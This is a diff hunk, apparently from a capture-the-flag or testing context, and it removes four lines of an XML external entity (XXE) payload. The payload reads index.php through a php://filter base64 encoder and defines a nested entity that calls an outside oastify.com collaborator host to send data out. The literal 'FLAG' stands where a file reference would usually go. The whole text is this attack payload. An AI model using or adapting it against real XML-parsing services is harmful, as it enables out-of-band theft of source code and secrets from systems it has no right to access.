@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=FLAG;'>">
-%eval;
-%exfiltrate;
